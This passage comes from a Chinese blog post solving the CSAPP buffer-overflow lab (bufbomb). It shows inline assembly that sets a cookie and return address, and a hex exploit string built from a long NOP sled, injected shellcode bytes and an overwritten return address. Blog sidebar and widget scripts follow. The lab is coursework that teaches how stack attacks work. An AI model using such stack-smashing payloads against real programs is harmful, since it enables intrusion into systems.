+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">"mov %esp,%eax"</span>); <span class="comment">// resume ebp register</span></span><br><span class="line">    __asm__(<span class="string">"add $0x28,%eax"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov %eax,%ebp"</span>);</span><br><span class="line">    __asm__(<span class="string">"mov $0x6830c384, %eax"</span>); <span class="comment">// eax = cookie</span></span><br><span class="line">    __asm__(<span class="string">"push $0x8048e3a"</span>); <span class="comment">// set return address</span></span><br><span class="line">    __asm__(<span class="string">"ret"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+我们通过上述编译后，将代码写入到栈上即可，并同时将<code>getbuf</code>函数的返回地址设置为<code>0x55682eb8</code>。最终的<code>buffer</code>为：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> </span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span></span><br><span class="line"></span><br><span class="line"><span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">90</span> <span class="number">89</span> e0 <span class="number">83</span> c0</span><br><span class="line"><span class="number">28</span> <span class="number">89</span> c5 b8 <span class="number">84</span> c3 <span class="number">30</span> <span class="number">68</span> <span class="number">68</span> <span class="number">3</span>a</span><br><span class="line"><span class="number">8</span>e <span class="number">04</span> <span class="number">08</span> c3 b8 <span class="number">2</span>e <span class="number">68</span> <span class="number">55</span></span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>总的来说，<code>lab3</code>的代码比<code>lab2</code>有趣多了，非常考验逻辑思维能力，通过学习对机器指令的执行过程有了非常熟悉的了解，也对缓冲区攻击的基本原理有了深刻的理解，当然实际的攻击过程远远比这复杂的多。计算机技术需要学习的技巧太多了。</li>
+</ul>
+<h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p>
+<ul>
+<li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li>
+<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li>
+<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+  <img id="wechat_subscriber_qcode" src="/images/2876768308.jpg" alt="Mike meng wechat" style="width: 200px; max-width: 100%;">
+  <div>公务程序猿.</div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0/" rel="tag"># 代码实现</a>
+          </div>
+
+        
+  <div class="post-widgets">
+    <div class="wp_rating">
+      <div id="wpac-rating"></div>
+    </div>
+  </div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2020/11/22/228/" rel="next" title="【Leetcode】  周赛216场">
+                  <i class="fa fa-chevron-left"></i> 【Leetcode】  周赛216场
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAPP-lab3-bufboomb"><span class="nav-number">1.</span> <span class="nav-text">CSAPP lab3 bufboomb</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目"><span class="nav-number">1.1.</span> <span class="nav-text">题目</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Level-0-Candle"><span class="nav-number">1.1.1.</span> <span class="nav-text">1. Level 0: Candle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Level-1-Sparkler"><span class="nav-number">1.1.2.</span> <span class="nav-text">2. Level 1: Sparkler</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Level-2-Firecracker"><span class="nav-number">1.1.3.</span> <span class="nav-text">3.Level 2: Firecracker</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Level-3-Dynamite"><span class="nav-number">1.1.4.</span> <span class="nav-text">4. Level 3: Dynamite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Level-4-Nitroglycerin"><span class="nav-number">1.1.5.</span> <span class="nav-text">5. Level 4: Nitroglycerin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#总结"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#null"><span class="nav-number">1.3.</span> <span class="nav-text">#</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="Mike meng"
+    src="/images/pic.jpg">
+  <p class="site-author-name" itemprop="name">Mike meng</p>
+  <div class="site-description" itemprop="description">a clever man and a foolish man!</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">188</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">31</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/mike-box" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;mike-box" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:mml1106@126.com" title="E-Mail &amp;rarr; mailto:mml1106@126.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/mike-box/mike-box.github.io/blob/master/atom.xml" title="Feed &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;mike-box&#x2F;mike-box.github.io&#x2F;blob&#x2F;master&#x2F;atom.xml" rel="noopener" target="_blank"><i class="fa fa-fw fa-Feed"></i>Feed</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" >| 总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span>
+<span id="busuanzi_container_site_uv" >| 总访客数 <span id="busuanzi_value_site_uv"></span> 人 </span>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.2"></script><script src="/js/motion.js?v=7.4.2"></script>
+<script src="/js/schemes/pisces.js?v=7.4.2"></script>
+<script src="/js/next-boot.js?v=7.4.2"></script>
+
+
+
+  
+
+
+
+
+
+  <script>
+  if (CONFIG.page.isPost) {
+    wpac_init = window.wpac_init || [];
+    wpac_init.push({
+      widget: 'Rating',
+      id: ,
+      el: 'wpac-rating',
+      color: 'fc6423'
+    });
+    (function() {
+      if ('WIDGETPACK_LOADED' in window) return;
+      WIDGETPACK_LOADED = true;
+      var mc = document.createElement('script');
+      mc.type = 'text/javascript';
+      mc.async = true;
+      mc.src = '//embed.widgetpack.com/widget.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(mc, s.nextSibling);
+    })();
+  }
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+<script type="text/x-mathjax-config">
+    MathJax.Ajax.config.path['mhchem'] = '//cdn.jsdelivr.net/npm/mathjax-mhchem@3';
+
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$', '$'], ['\\(', '\\)'] ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        extensions: ['[mhchem]/mhchem.js'],
+      equationNumbers: {
+        autoNumber: 'AMS'
+      }
+    }
+  });
+
+  MathJax.Hub.Register.StartupHook('TeX Jax Ready', function() {
+    MathJax.InputJax.TeX.prefilterHooks.Add(function(data) {
+      if (data.display) {
+        var next = data.script.nextSibling;
+        while (next && next.nodeName.toLowerCase() === '#text') {
+          next = next.nextSibling;
+        }
+        if (next && next.nodeName.toLowerCase() === 'br') {
+          next.parentNode.removeChild(next);
+        }
+      }
+    });
+  });
+
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i = 0; i < all.length; i += 1) {
+      element = document.getElementById(all[i].inputID + '-Frame').parentNode;
+      if (element.nodeName.toLowerCase() == 'li') {
+        element = element.parentNode;
+      }
+      element.classList.add('has-jax');
+    }
+  });
+</script>
+<script>
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS-MML_HTMLorMML', () => {
+    MathJax.Hub.Typeset();
+  }, window.MathJax);
+</script>
+
+    
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.includes(item);
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: '8Dt7hB7Fx8exlW88EXinb5mF-gzGzoHsz',
+    appKey: 'aWHmgsVOAHuLla4w3OV0UOqh',
+    placeholder: "Just go go",
+    avatar: 'wavatar',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: '' || 'zh-cn',
+    path: location.pathname,
+    recordIP: false,
+    serverURLs: ''
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
